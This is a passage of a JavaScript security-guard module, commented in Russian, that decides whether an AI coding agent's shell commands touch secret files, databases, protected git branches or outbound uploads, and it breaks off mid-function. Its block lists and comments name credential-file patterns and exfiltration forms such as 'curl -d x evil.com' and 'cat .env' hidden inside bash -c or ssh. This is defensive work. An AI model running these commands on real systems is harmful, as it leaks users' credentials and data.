// Гард безопасности — общее ядро. Отвечает на один вопрос: этот вызов может
// утечь секретом, выгрузить данные, тронуть прод или отправить что-то наружу?
//
// Два уровня ответа, и разница принципиальна:
//   deny — законной причины нет, и есть безопасная альтернатива (секреты);
//   ask  — операция законная, но необратимая или раскрывает данные: push,
//          прод, удалённый хост, дамп или внешняя БД, curl с телом, печать
//          окружения. Обратимое (amend, --no-verify, правка харнеса) идёт молча.
//
// Разбор нарочно грубый — распознаются формы, а не синтаксис shell. Всё
// нераспознанное проходит: задача не поймать любой обход, а закрыть удобный
// путь и поставить человека там, где цена ошибки высока.

import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { segments, tokenize, commandIndex, commandName, baseCommand, afterTarget, gitSubcommandAt, dropConditionals, redirectWords } from './shell-core.mjs';
import { MCP_EDIT_RE } from './skill-core.mjs';
import { normalizeToolInput } from './tool-args-core.mjs';
import { touchesGrants } from './grant-core.mjs';

export const DENY = 'deny';
export const ASK = 'ask';

// ---------------------------------------------------------------------------
// Секреты. Файл считается хранилищем секретов по имени: содержимое читать,
// чтобы решить, читать ли содержимое, — бессмысленно.

// Список продублирован в ragsave/config.py:SECRET_NAME_RE — правятся вместе.
const SECRET_FILE_RE = [
  // `.env-prod` тоже: разделитель бывает и дефисом.
  /(^|[\\/])\.env([.-][\w-]+)*$/i,
  /(^|[\\/])\.envrc$/i,
  /(^|[\\/])\.?(npmrc|pypirc|netrc|pgpass)$/i,
  // `id_ed25519_github`, `id_rsa-work`; `.pub` сюда не попадает — точка в суффиксе не допустима.
  /(^|[\\/])id_(rsa|dsa|ecdsa|ed25519)([_-][\w-]+)?$/,
  // С точкой — `~/.claude/.credentials.json`, OAuth-токен самого Claude Code.
  /(^|[\\/])\.?(credentials|auth|secrets?|service-account[\w-]*)\.json$/i,
  /(^|[\\/])\.?(credentials|secrets?)\.ya?ml$/i,
  /(^|[\\/])\.git-credentials$/,
  // Terraform: state хранит выходные значения и пароли ресурсов открытым текстом.
  /\.(tfstate(\.backup)?|tfvars(\.json)?)$/i,
  /\.(pem|p12|pfx|keystore|jks)$/i,
  // `.key` без приставки не берём: `obj.key` в коде и `jq .data.key` — не файлы.
  /(^|[\\/])[\w.-]*(private|secret)[\w.-]*\.key$/i,
  // `master.key` — ключ к Rails credentials.yml.enc.
  /(^|[\\/])(server|tls|ssl|client|master)\.key$/i,
  // Окружение процесса целиком. В config.py нет: в проекте его не бывает.
  /(^|[\\/])proc[\\/](self|\d+)[\\/]environ$/,
  // Учётные данные CLI: имена файлов общие (`config`, `config.json`), секретом
  // их делает каталог.
  /(^|[\\/])\.aws[\\/]credentials$/,
  /(^|[\\/])\.docker[\\/]config\.json$/,
  /(^|[\\/])\.kube[\\/]config$/,
  /(^|[\\/])gh[\\/]hosts\.ya?ml$/,
  /(^|[\\/])glab-cli[\\/]config\.ya?ml$/,
];

// Примеры и шаблоны — не секреты, в них имена переменных без значений.
const SECRET_EXEMPT_RE = /[.-](example|sample|template|dist|tpl)$|(^|[\\/])\.env\.example$/i;

export function isSecretPath(p) {
  const s = String(p || '');
  if (!s || SECRET_EXEMPT_RE.test(s)) return false;
  return SECRET_FILE_RE.some((re) => re.test(s));
}

// Значение, похожее на живой секрет, внутри произвольного текста. Нужно там,
// где текст уходит наружу — во внешний CLI, в тело запроса, в публикацию:
// ничего из этого списка туда попасть не должно. Проверяем формы известных
// токенов, а не энтропию — энтропийный порог ловит хеши коммитов и base64
// картинок.
//
// Сейчас в проде вызывающих нет (подсистема делегирования удалена 9 сентября
// 2026), примитив оставлен под будущий исходящий канал и покрыт тестами.
const SECRET_VALUE_RE = [
  /\b(sk|pk)-[A-Za-z0-9_-]{20,}/,                       // OpenAI/Anthropic-подобные
  /\bgh[pousr]_[A-Za-z0-9]{30,}/,                        // GitHub
  /\bglpat-[A-Za-z0-9_-]{20,}/,                          // GitLab
  /\b\d{8,10}:AA[A-Za-z0-9_-]{30,}/,                     // Telegram bot token
  /\bAKIA[0-9A-Z]{16}\b/,                                // AWS access key id
  /-----BEGIN [A-Z ]*PRIVATE KEY-----/,
  /\b(postgres|postgresql|mysql|mongodb(\+srv)?|redis|amqp):\/\/[^\s:@/]+:[^\s@/]+@/i, // DSN с паролем
  /\b(api[_-]?key|secret[_-]?key|access[_-]?token|password|passwd)\s*[:=]\s*["']?[A-Za-z0-9_\-./+]{12,}/i,
];

export function findSecretValue(text) {
  const s = String(text || '');
  for (const re of SECRET_VALUE_RE) {
    const m = s.match(re);
    if (m) return m[0].slice(0, 12) + '…';
  }
  return null;
}

// ---------------------------------------------------------------------------
// База данных: выгрузка целиком и обращение к неместному хосту.

const DUMP_CMDS = new Set(['pg_dump', 'pg_dumpall', 'mysqldump', 'mongodump', 'pgbackrest']);
const DB_CLIENTS = new Set(['psql', 'mysql', 'mongosh', 'mongo', 'redis-cli', 'clickhouse-client']);
const LOCAL_HOST_RE = /^(localhost|127\.0\.0\.1|::1|0\.0\.0\.0|host\.docker\.internal|db|postgres|mysql|redis)$/i;

function hostsIn(seg, toks) {
  const hosts = [];
  for (let i = 0; i < toks.length; i++) {
    const t = toks[i];
    if (t === '-h' || t === '--host') { if (toks[i + 1]) hosts.push(toks[i + 1]); }
    else if (/^--host=/.test(t)) hosts.push(t.split('=')[1]);
  }
  for (const m of String(seg).matchAll(/\b\w+:\/\/(?:[^\s/@]*@)?([\w.-]+)/g)) hosts.push(m[1]);
  return hosts.filter(Boolean);
}

// Переменные окружения, из которых клиент берёт хост.
const DB_HOST_ENV_RE = /(?:^|[\s;&|(])(?:PGHOST|MYSQL_HOST)=["']?([\w.-]+)/g;

// Хост клиента БД: кроме общих форм — слитный `-hHOST` (mysql, psql), строка
// подключения psql `host=…` и переменная окружения. Переменную ищем по всей
// команде: `export PGHOST=prod; psql app` задаёт её в соседнем сегменте.
function dbHostsIn(raw, seg, toks) {
  const hosts = hostsIn(seg, toks);
  for (const t of toks) {
    const joined = t.match(/^-h([^-].*)$/);
    if (joined) hosts.push(joined[1]);
    for (const m of t.matchAll(/(?:^|\s)host(?:addr)?=([\w.-]+)/g)) hosts.push(m[1]);
  }
  for (const m of String(raw).matchAll(DB_HOST_ENV_RE)) hosts.push(m[1]);
  return hosts;
}

// ---------------------------------------------------------------------------
// Ветки и деплой.

const PROTECTED_BRANCH_RE = /^(main|master|dev|develop|prod|production|release(\/.*)?)$/i;
const PROD_TOKEN_RE = /(^|[^a-z])prod(uction)?([^a-z]|$)/i;

// Опции push с отдельным аргументом: без них `-o ci.skip origin` считал
// remote-ом `ci.skip`, а `origin` — веткой.
const PUSH_ARG_OPTS = ['-o', '--push-option', '--repo', '--receive-pack', '--exec'];

// at — индекс подкоманды `push` в токенах.
// → { reason, cat } или null. cat — категория разрешения: force и удаление снимает
// только своё слово, прочее — обычное «запушь».
function gitPushReason(toks, at) {
  const push = (reason, cat = 'push') => ({ reason, cat });
  const args = toks.slice(at + 1);
  // `-f` бывает и в склейке с другими короткими флагами: `-uf`.
  if (args.some((t) => /^(-[a-z]*f[a-z]*|--force|--force-with-lease.*)$/.test(t))) {
    return push('force push переписывает историю', 'push-force');
  }
  if (args.some((t) => ['--all', '--mirror', '--branches'].includes(t))) {
    return push('push всех веток, включая защищённые', 'push-delete');
  }
  if (args.some((t) => t === '-d' || t === '--delete')) return push('удаление ветки на remote', 'push-delete');
  // Цель вычисляется при запуске — `$(git branch --show-current)`, `$BRANCH`:
  // в команде её имени нет, решает человек.
  if (args.some((t) => /[$`]/.test(t))) return push('push: цель вычисляется при запуске, в команде её не видно');

  const free = [];
  for (let i = 0; i < args.length; i++) {
    if (PUSH_ARG_OPTS.includes(args[i])) i++;
    else if (!args[i].startsWith('-')) free.push(args[i]);
  }
  // git push [remote] [refspec…] — проверяется каждый refspec, не только последний.
  const refspecs = free.slice(1);
  // `--dry-run` ничего не публикует.
  if (args.some((t) => t === '--dry-run' || t === '-n')) return null;
  // Без refspec push уходит в текущую ветку — её имени в команде нет, решает человек.
  if (refspecs.length === 0) return push('push в текущую ветку (refspec не указан)');
  for (const spec of refspecs) {
    // `+` перед refspec — тот же force push, только для одной ветки.
    if (spec.startsWith('+')) return push('force push (+refspec) переписывает историю', 'push-force');
    if (spec.startsWith(':')) return push(`удаление ветки «${spec.slice(1)}» на remote`, 'push-delete');
    const branch = spec.split(':').pop().replace(/^refs\/heads\//, '');
    if (branch === 'HEAD' || branch === '@') return push('push в текущую ветку (HEAD)');
    if (branch.includes('*')) return push(`push по шаблону «${spec}» задевает все ветки`, 'push-delete');
    if (PROTECTED_BRANCH_RE.test(branch)) return push(`push в защищённую ветку «${branch}»`);
  }
  // Push — точка, где человек проверяет, что уходит наружу: спрашивается любой.
  return push(`push в «${refspecs.map((s) => s.split(':').pop()).join('», «')}»`);
}

// ---------------------------------------------------------------------------
// Отправка данных наружу: curl/wget с телом запроса или загрузкой файла.

// curl — `-d`, `-F`, `-T`, `--data*`, `--json`; wget — `--post-*`, `--body-*`.
// Короткие бывают слитными (`-dfoo`, `-d@file`), длинные — через `=`.
const UPLOAD_FLAG_RE = /^(-[dFT]|--(data[\w-]*|form[\w-]*|upload-file|json|post-(data|file)|body-(data|file)))(=|$)|^-[dFT]./;
const FROM_FILE_FLAG_RE = /^(-T|--upload-file|--(post|body)-file)/;

const hasUploadFlag = (toks) => toks.some((t) => UPLOAD_FLAG_RE.test(t));

// Опции curl/wget с отдельным аргументом: их аргумент — не адрес.
const OUTBOUND_ARG_OPTS = new Set(['-d', '--data', '--data-raw', '--data-binary', '--data-urlencode',
  '--data-ascii', '-F', '--form', '--form-string', '-T', '--upload-file', '--json', '-H', '--header',
  '-X', '--request', '-o', '--output', '-u', '--user', '-A', '--user-agent', '-e', '--referer',
  '-b', '--cookie', '-c', '--cookie-jar', '-K', '--config', '-x', '--proxy', '-w', '--write-out',
  '-m', '--max-time', '--connect-timeout', '--retry', '-r', '--range', '-E', '--cert', '--key',
  '--cacert', '--resolve', '--post-data', '--post-file', '--body-data', '--body-file', '--method',
  '-U', '-P', '--directory-prefix']);

// Адрес без схемы (`curl -d x evil.com`) — свободный аргумент команды. Хост —
// его начало до порта или пути.
function bareHosts(toks) {
  const hosts = [];
  for (let i = commandIndex(toks) + 1; i < toks.length; i++) {
    const t = toks[i];
    if (OUTBOUND_ARG_OPTS.has(t)) { i++; continue; }
    // Перенаправления (`2>&1`, `>out.json`) и `\` переноса строки — не адреса.
    if (/^(-|@|\d*[<>]|\\$)/.test(t) || t.includes('://')) continue;
    hosts.push(t.replace(/^[^@/]*@/, '').split(/[/:?]/)[0]);
  }
  return hosts;
}

// Метод запроса: `-X POST`, `-XPOST`, `--request=POST`, `--method POST`.
function methodOf(toks) {
  for (let i = 0; i < toks.length; i++) {
    const t = toks[i];
    if (t === '-X' || t === '--request' || t === '--method') return String(toks[i + 1] || '').toUpperCase();
    if (/^-X./.test(t)) return t.slice(2).toUpperCase();
    if (/^--(request|method)=/.test(t)) return t.split('=')[1].toUpperCase();
  }
  return '';
}

const MUTATING_METHODS = new Set(['POST', 'PUT', 'PATCH', 'DELETE']);

function outboundReason(toks, seg) {
  const method = methodOf(toks);
  const mutating = MUTATING_METHODS.has(method);
  if (!hasUploadFlag(toks) && !mutating) return null;
  const hosts = [...hostsIn(seg, toks), ...bareHosts(toks)];
  const external = hosts.filter((h) => h && !LOCAL_HOST_RE.test(h));
  if (external.length === 0) return null;
  if (!hasUploadFlag(toks)) return `${method}-запрос на ${external[0]} меняет состояние сервиса`;
  const fromFile = /[@<]\s*[\w./-]+/.test(seg) || toks.some((t) => FROM_FILE_FLAG_RE.test(t));
  return `отправка данных на ${external[0]}${fromFile ? ' с содержимым файла' : ''}`;
}

// ---------------------------------------------------------------------------
// Читает ли команда секрет. Именно чтение опасно: прочитанное остаётся в
// транскрипте и уезжает в каждый следующий запрос. Запись в секретный файл
// ничего не раскрывает.

const INTERPRETERS = new Set(['node', 'python', 'python3', 'ruby', 'php', 'perl', 'deno', 'bun', 'tsx', 'ts-node']);

// Команды, которые показывают содержимое файла или исполняют его.
const READS_FILE = new Set([
  'cat', 'head', 'tail', 'less', 'more', 'bat', 'nl', 'tac', 'rev', 'od', 'xxd', 'strings',
  'grep', 'egrep', 'fgrep', 'rg', 'ag', 'ack', 'sed', 'awk', 'gawk', 'cut', 'sort', 'uniq',
  'source', '.', 'diff', 'vimdiff', 'base64', 'openssl',
  'dd', 'paste', 'hexdump', 'hd', 'fold', 'fmt', 'expand', 'iconv', 'column', 'pr', 'comm', 'join',
  ...INTERPRETERS, 'jq', 'yq',
]);

// Копирование и передача: опасен источник, а не назначение.
const TRANSFER = new Set(['cp', 'mv', 'scp', 'rsync', 'zip', 'install', 'ln']);

// tar: архив — аргумент `f` (`cf -`, `-czf out.tgz`, `--file=…`), остальные операнды —
// члены. При создании член читается (`tar cf - .env | tar xOf -` — тот же `cat`),
// при извлечении — только с `O`/`--to-stdout`, иначе он пишется на диск.
function tarReadsSecret(toks, secrets) {
  const args = toks.slice(commandIndex(toks) + 1);
  let archive = null;
  let extract = false;
  let toStdout = false;
  for (let i = 0; i < args.length; i++) {
    const t = args[i];
    if (t === '--file') archive = args[i + 1];
    else if (t.startsWith('--file=')) archive = t.slice('--file='.length);
    else if (t === '--extract' || t === '--get') extract = true;
    else if (t === '--to-stdout') toStdout = true;
    // Склейка коротких: `-czf`, а первым аргументом — и без дефиса (`cf`, `xOzf`).
    else if (/^-[A-Za-z]+$/.test(t) || (i === 0 && /^[A-Za-z]+$/.test(t))) {
      if (t.includes('x')) extract = true;
      if (t.includes('O')) toStdout = true;
      if (t.includes('f')) archive = args[i + 1];
    }
  }
  if (extract && !toStdout) return null;
  return secrets.find((s) => s !== archive) || null;
}

// `xargs -a .env cmd` отдаёт строки файла аргументами — то же перенаправление ввода.
function xargsInputs(toks) {
  const files = [];
  const at = toks.findIndex((t) => path.basename(t) === 'xargs');
  if (at === -1) return files;
  for (let i = at + 1; i < commandIndex(toks); i++) {
    const t = toks[i];
    if (t === '-a' || t === '--arg-file') files.push(toks[i + 1] || '');
    else if (t.startsWith('--arg-file=')) files.push(t.slice('--arg-file='.length));
    else if (/^-a./.test(t)) files.push(t.slice(2));
  }
  return files;
}

// dotenv-cli: `dotenv [-e файл]… [-v k=v] [-p VAR] [--] команда`. Сам он файла не
// показывает — кроме `-p`, что печатает значение переменной; опасна запускаемая
// команда (`printenv`, `cat .env`).
const DOTENV_ARG_OPTS = new Set(['-e', '-v', '-p']);

function dotenvParts(toks, at) {
  const opts = [];
  let i = at + 1;
  for (; i < toks.length && toks[i].startsWith('-'); i++) {
    if (toks[i] === '--') {
      i++;
      break;
    }
    const opt = toks[i];
    if (DOTENV_ARG_OPTS.has(opt)) i++;
    opts.push({ opt, arg: toks[i] });
  }
  return { opts, command: toks.slice(i).join(' ') };
}

function dotenvPrintsSecret(toks) {
  const { opts } = dotenvParts(toks, commandIndex(toks));
  if (!opts.some((o) => o.opt === '-p')) return null;
  const files = opts.filter((o) => o.opt === '-e').map((o) => o.arg);
  return (files.length ? files : ['.env']).find(isSecretPath) || null;
}

function secretReason(file) {
  return {
    level: DENY,
    reason: `\`${file}\` — хранилище секретов, чтение запрещено. ` +
      'Имя переменной — из `.env.example`; значение — запроси у пользователя.',
  };
}

// Кандидаты в пути — куски строки между символами, которых в пути не бывает:
// так путь находится и внутри кода (`readFileSync('.env')`), и после `if=`,
// `HEAD:`, `$HOME`. Разрез, а не поиск regex-ом: поиск с жадным префиксом
// квадратичен, и команда в 100 КБ разбиралась 12 секунд.
// `*`/`?` режутся вторым шагом: шаблон, который целиком кончается суффиксом
// примера (`--include=.env*.example`), совпадает только с примерами и
// выбрасывается до разреза, иначе давал бы кандидат `.env`. `.env*` остаётся.
const NOT_GLOB_PATH_RE = /[^\w@.\-/\\~+*?]+/;

function secretPathsIn(seg, toks) {
  const words = String(seg).split(NOT_GLOB_PATH_RE)
    .flatMap((w) => (/[*?]/.test(w) && SECRET_EXEMPT_RE.test(w) ? [] : w.split(/[*?]+/)));
  const found = new Set([...words, ...toks]);
  // `@файл` — синтаксис curl для «взять тело из файла», сама «собака» частью
  // пути не является и мешала бы сопоставлению имени.
  // `\.` — экранированная точка regex (`process\.env`, `import\.meta\.env`):
  // и в regex, и в неквотированном shell это обычная точка, а не разделитель
  // пути перед `.env`.
  return [...found]
    .map((c) => String(c).replace(/^(-\w)?@/, '').replace(/\\\./g, '.'))
    .filter(isSecretPath);
}

// Рекурсивный grep без `--include` читает каждый файл дерева, и `.env` рядом с
// кодом — тоже: `grep -rn token .` печатает строку с ключом. Имени секрета в
// команде нет, поэтому по пути его не поймать — нужен glob.
const GREP_CMDS = new Set(['grep', 'egrep', 'fgrep']);
// Короткие опции grep с аргументом: после них остаток склейки — аргумент,
// а не флаги (`-error` — шаблон `rror`, не `-r`).
const GREP_ARG_SHORT = 'efmABCdD';

// Операнд — файл, а не каталог: у имени есть расширение (`app.ts`, `*.mjs`,
// `vitest.config.*`). Рекурсия по одним явным файлам дерево не обходит, и
// `.env` так не прочесть — а сам `.env` операндом ловит secretPathsIn.
const FILE_OPERAND_RE = /(^|\/)[^/.][^/]*\.[^/]+$/;
const REDIRECT_RE = /^\d*[<>]/;

// Имена, на которых пробуем шаблон `--include`: `--include=*` и `--include=.env*`
// пускают grep в `.env` так же, как отсутствие шаблона.
const ENV_SAMPLES = ['.env', '.env.local', '.env.production', '.envrc'];

function includeHitsEnv(glob) {
  const g = glob.replace(/^(['"])(.*)\1$/, '$2');
  // fnmatch по имени файла: `*` берёт и ведущую точку, классы `[…]` — как есть.
  const src = g.replace(/[.+^${}()|\\]/g, '\\$&').replace(/\*/g, '.*').replace(/\?/g, '.');
  try {
    const re = new RegExp(`^${src}$`);
    return ENV_SAMPLES.some((s) => re.test(s));
  } catch {
    return true;
  }
}

// Разбор аргументов grep: файлы — операнды после шаблона, `-f` — файл шаблонов.
function grepArgs(toks) {
  const args = toks.slice(commandIndex(toks) + 1);
  let recursive = false;
  const includes = [];
  const patternFiles = [];
  // Шаблон задан через -e/-f — тогда первый операнд уже путь, а не шаблон.
  let patternOpt = false;
  const operands = [];
  for (let i = 0; i < args.length; i++) {
    const t = args[i];
    if (t === '--') {
      operands.push(...args.slice(i + 1));
      break;
    }
    if (t === '--include') {
      includes.push(args[++i] ?? '');
      continue;
    }
    if (t.startsWith('--include=')) {
      includes.push(t.slice('--include='.length));
      continue;
    }
    if (t === '--recursive' || t === '--dereference-recursive') recursive = true;
    else if (/^--(regexp|file)=/.test(t)) {
      patternOpt = true;
      if (t.startsWith('--file=')) patternFiles.push(t.slice('--file='.length));
    } else if (t === '--regexp' || t === '--file') {
      patternOpt = true;
      if (t === '--file') patternFiles.push(args[i + 1] ?? '');
      i++;
    } else if (/^-[^-]/.test(t)) {
      for (const [k, ch] of [...t.slice(1)].entries()) {
        if (ch === 'r' || ch === 'R') recursive = true;
        if (!GREP_ARG_SHORT.includes(ch)) continue;
        if (ch === 'e' || ch === 'f') patternOpt = true;
        // Опция последняя в склейке — её аргумент следующим токеном.
        const last = k === t.length - 2;
        if (ch === 'f') patternFiles.push(last ? args[i + 1] ?? '' : t.slice(k + 2));
        if (last) i++;
        break;
      }
    } else if (REDIRECT_RE.test(t)) {
      // `2>/dev/null` — перенаправление, не путь; голый `>` забирает следующий токен.
      if (/^\d*[<>]+$/.test(t)) i++;
    } else if (!t.startsWith('--')) operands.push(t);
  }
  return { recursive, includes, patternFiles, files: patternOpt ? operands : operands.slice(1) };
}

function grepWithoutInclude(toks) {
  const { recursive, includes, files } = grepArgs(toks);
  if (!recursive) return false;
  if (includes.length) return includes.some(includeHitsEnv);
  return !(files.length && files.every((p) => FILE_OPERAND_RE.test(p)));
}

// Шаблон grep — строка, а не файл: `git ls-files | grep '\.npmrc'` ничего не читает.
function grepReadsSecret(toks) {
  const { includes, patternFiles, files } = grepArgs(toks);
  return secretPathsIn([...files, ...patternFiles, ...includes].join(' '), [])[0] || null;
}

// jq: первый свободный аргумент — программа, а не путь (`jq '.env'` берёт
// ключ); с `-f` в любой склейке (`-nf`, `-fn`) он — файл программы. Остальные
// свободные — файлы, кроме идущих после `--args`/`--jsonargs`: те — строки. Опции
// разбираются и после них: `--args . a --rawfile s .env` читает `.env`.
// Программа — null, когда она в файле.
const JQ_PAIR_OPTS = new Set(['--arg', '--argjson']);
const JQ_FILE_PAIR_OPTS = new Set(['--rawfile', '--slurpfile']);

function jqArgs(toks) {
  const args = toks.slice(commandIndex(toks) + 1);
  const files = [];
  const positional = [];
  let fromFile = false;
  let strings = false;
  let opts = true;
  for (let i = 0; i < args.length; i++) {
    const t = args[i];
    if (opts && t === '--') {
      opts = false;
    } else if (opts && REDIRECT_RE.test(t)) {
      if (/^\d*[<>]+$/.test(t)) i++;
    } else if (opts && t.startsWith('-') && t !== '-') {
      if (JQ_FILE_PAIR_OPTS.has(t)) {
        files.push(args[i + 2] ?? '');
        i += 2;
      } else if (JQ_PAIR_OPTS.has(t)) i += 2;
      else if (t === '--indent' || t === '-L') i++;
      else if (t === '--args' || t === '--jsonargs') strings = true;
      else if (t === '--from-file' || /^-[^-]*f/.test(t)) fromFile = true;
    } else positional.push({ t, strings });
  }
  const [first, ...rest] = positional;
  if (first && fromFile) files.push(first.t);
  files.push(...rest.filter((p) => !p.strings).map((p) => p.t));
  return { program: fromFile ? null : first?.t ?? null, files };
}

function readsSecret(seg, toks, cmd) {
  // Цель перенаправления вывода — запись, она безвредна: `echo X > .env`,
  // `cat <<EOF > .env`. Отсеиваем её до всего остального, иначе читающая
  // команда слева (`cat`) делала бы запрещённой обычную запись.
  const redirectTargets = [...String(seg).matchAll(/>>?\s*([\w@.\-/\\~]+)/g)].map((m) => m[1]);
  const secrets = secretPathsIn(seg, toks).filter((s) => !redirectTargets.includes(s));
  if (secrets.length === 0) return null;

  // Перенаправление ввода отдаёт файл любой команде, и тогда её имя ничего не
  // решает: `while read …; done < .env`, `cat<.env`. `<<` и `<<<` — heredoc и
  // here-string, `<(…)` — подстановка процесса: пути там нет.
  const inputs = [...dropConditionals(seg).matchAll(/(?:^|[^<])<(?![<(])\s*([\w@.\-/\\~$]+)/g)]
    .map((m) => m[1].replace(/\\\./g, '.'))
    .concat(xargsInputs(toks))
    .filter(isSecretPath);
  if (inputs.length) return inputs[0];

  if (cmd === 'jq') return secretPathsIn('', jqArgs(toks).files)[0] || null;
  if (GREP_CMDS.has(cmd)) return grepReadsSecret(toks);
  if (READS_FILE.has(cmd)) return secrets[0];
  if (cmd === 'tar') return tarReadsSecret(toks, secrets);

  if (TRANSFER.has(cmd)) {
    // Последний свободный аргумент — назначение; всё до него читается.
    const free = toks.slice(1).filter((t) => !t.startsWith('-'));
    const dest = free[free.length - 1] || '';
    return secrets.find((s) => s !== dest) || null;
  }

  // Отправка секрета наружу телом запроса: `curl -d @secrets.json`, `-T .env`.
  // Здесь запрет, а не вопрос: подтверждать утечку ключей нечем.
  if (/^(curl|wget|http|httpie)$/.test(cmd) && hasUploadFlag(toks)) {
    return secrets[0];
  }

  // Остальное — команда упоминает секрет, но роли его мы не поняли. Молчим:
  // ложный запрет на `git add .env` или `ls -la .env` толкает искать обход,
  // а содержимого эти команды не показывают.
  return null;
}

// Обёртки, за которыми прячется другая команда. Без их разбора гард ловит
// `cat .env`, но пропускает `bash -c "cat .env"` и `ssh vps "cat .env"` —
// а это не изощрённый обход, а то, как команда пишется естественно.
const SHELL_WRAPPERS = new Set(['bash', 'sh', 'zsh', 'dash', 'ksh', 'fish']);
const CONTAINER_CMDS = new Set(['docker', 'docker-compose', 'podman', 'kubectl']);

// Подкоманды git, которые печатают содержимое файла. Секрет, однажды попавший
// в историю, читается ими и без рабочей копии.
const GIT_READ_SUBCMDS = new Set(['show', 'cat-file', 'diff', 'log', 'blame']);

// `git commit -F .env` кладёт содержимое файла в сообщение коммита, а дальше в
// историю и push: файл прочитан так же, как `cat .env`. Файл сообщения — значение
// `-F`/`--file` (`-F f`, `-Ff`, `-aF f`, `--file f`, `--file=f`) у commit, tag, notes, merge,
// у commit ещё шаблон `-t`/`--template`.
// `git config -f .env -l` печатает файл как `cat`: флаг там `-f`/`--file`.
// `args` — короткие флаги с аргументом: в `-mFix` после `m` идёт текст, а не флаг `F`.
const GIT_FILE_FLAGS = {
  commit: { args: 'mFCct', files: 'Ft', long: ['--file', '--template'] },
  tag: { args: 'mFu', files: 'F', long: ['--file'] },
  notes: { args: 'mFCc', files: 'F', long: ['--file'] },
  merge: { args: 'mFsX', files: 'F', long: ['--file'] },
  config: { args: 'f', files: 'f', long: ['--file'] },
};

function gitFileOperands(toks, at) {
  const flags = at < 0 ? null : GIT_FILE_FLAGS[toks[at]];
  if (!flags) return [];
  const short = new RegExp(`^-[A-Za-z]*?([${flags.args}])(.*)$`);
  const files = [];
  for (let i = at + 1; i < toks.length && toks[i] !== '--'; i++) {
    const t = toks[i];
    const long = flags.long.find((opt) => t === opt || t.startsWith(`${opt}=`));
    const m = t.startsWith('--') ? null : short.exec(t);
    if (long) files.push(t === long ? toks[++i] : t.slice(long.length + 1));
    else if (m) {
      const value = m[2] || toks[++i];
      if (flags.files.includes(m[1])) files.push(value);
    }
  }
  return files.filter((file) => file && file !== '-');
}

// Секрет по имени или по цели симлинка; путь, вычисляемый при запуске
// (`-F "$f"`, `-F $(…)`), в команде не виден — решает человек.
function gitFileVerdict(toks, at) {
  for (const file of gitFileOperands(toks, at)) {
    if (/[$`]/.test(file)) {
      return { level: ASK, reason: `git читает файл \`${file}\`: путь вычисляется при запуске, в команде его не видно.` };
    }
    if (isSecretPath(file)) return secretReason(file);
    const real = resolveReal(file);
    if (isSecretPath(real)) return secretReason(`${file}\` → \`${real}`);
  }
  return null;
}

// Опции с аргументом до цели: без них `ssh -p 2222 vps cat .env` считал хостом
// `2222`, а командой — `vps cat .env`.
const SSH_ARG_OPTS = ['-b', '-B', '-c', '-D', '-E', '-e', '-F', '-I', '-i', '-J', '-L', '-l', '-m',
  '-O', '-o', '-p', '-Q', '-R', '-S', '-W', '-w'];
const EXEC_ARG_OPTS = ['-u', '--user', '-e', '--env', '--env-file', '-w', '--workdir',
  '--detach-keys', '--index', '-n', '--namespace', '-c', '--container', '--context', '-f', '--filename'];
const RUN_ARG_OPTS = [...EXEC_ARG_OPTS, '-v', '--volume', '-p', '--publish', '--name', '--network',
  '--net', '--entrypoint', '-m', '--memory', '--cpus', '-l', '--label', '--mount', '--platform',
  '--restart', '-h', '--hostname', '--add-host', '--device', '--cap-add', '--cap-drop', '--ulimit',
  '--log-driver', '--log-opt', '--pull', '--tmpfs', '--expose', '--link', '--volumes-from', '--ipc',
  '--pid', '--shm-size', '--stop-signal'];

// Команды, спрятанные внутри аргументов: `-c "…"`, `eval`, удалённая команда
// ssh, тело `find -exec`, команда внутри контейнера.
function nestedCommands(toks, cmd) {
  const out = [];
  const at = commandIndex(toks);

  if (SHELL_WRAPPERS.has(cmd)) {
    for (let i = at + 1; i < toks.length; i++) {
      if (/^-[a-z]*c$/i.test(toks[i]) && toks[i + 1]) out.push(toks[i + 1]);
    }
  }

  if (cmd === 'eval') out.push(toks.slice(at + 1).join(' '));

  if (cmd === 'dotenv') out.push(dotenvParts(toks, at).command);

  if (cmd === 'ssh') out.push(afterTarget(toks, at + 1, SSH_ARG_OPTS).join(' '));

  if (CONTAINER_CMDS.has(cmd)) {
    const exec = toks.indexOf('exec');
    const run = toks.indexOf('run');
    if (exec !== -1 || run !== -1) {
      const start = exec !== -1 ? exec : run;
      let rest = afterTarget(toks, start + 1, exec !== -1 ? EXEC_ARG_OPTS : RUN_ARG_OPTS);
      // kubectl exec pod -c ctr -- команда: опции бывают и после цели.
      if (rest.includes('--')) rest = rest.slice(rest.indexOf('--') + 1);
      out.push(rest.join(' '));
    }
  }

  if (cmd === 'find') {
    const i = toks.findIndex((t) => t === '-exec' || t === '-execdir' || t === '-ok');
    if (i !== -1) {
      out.push(toks.slice(i + 1).filter((t) => !['{}', ';', '\\;', '+'].includes(t)).join(' '));
    }
  }

  return out.filter((c) => c && c.trim());
}

// Первое слово вложенной команды — чтобы понять, читает ли она файл, когда
// путь остался снаружи (`find . -name .env -exec cat {} \;`).
function nestedReadsFile(nested) {
  return nested.some((c) => READS_FILE.has(baseCommand(commandName(tokenize(c)))));
}

// Команда печатает окружение целиком: голый `env` (и за обёрткой — `sudo env`),
// `printenv` без имени, `set`, `export -p`, `declare -x`, программа jq с `env`
// или `$ENV` целиком (`env`, `[env]`, `$ENV | keys`), а не с одной переменной
// (`env.HOME`, `$ENV["HOME"]`); ключ `.env`, переменная `$env` и строка `"env"` —
// не окружение. Имя команды или null.
const JQ_ENV_RE = /(?<![\w."$])(?:\$ENV|env)(?![\w"]|\s*[.[])/g;

// `{env, x}` и `{env: …}` — ключ объекта (`{env}` = `{env: .env}`), а не окружение:
// слева `{` или `,` внутри фигурных скобок, справа `,`, `}` или `:`.
function jqObjectKey(program, at, len) {
  if (!/^\s*[,}:]/.test(program.slice(at + len))) return false;
  const before = program.slice(0, at).trimEnd();
  if (before.endsWith('{')) return true;
  if (!before.endsWith(',')) return false;
  const open = [];
  for (const ch of before) {
    if ('{[('.includes(ch)) open.push(ch);
    else if ('}])'.includes(ch)) open.pop();
  }
  return open[open.length - 1] === '{';
}

function jqPrintsEnv(program) {
  const s = String(program ?? '');
  return [...s.matchAll(JQ_ENV_RE)].some((m) => m[0] === '$ENV' || !jqObjectKey(s, m.index, m[0].length));
}

function printsEnv(toks) {
  const at = commandIndex(toks);
  const cmd = path.basename(toks[at] || '');
  const rest = toks.slice(at + 1);
  // `env` — обёртка: без команды после него он печатает окружение.
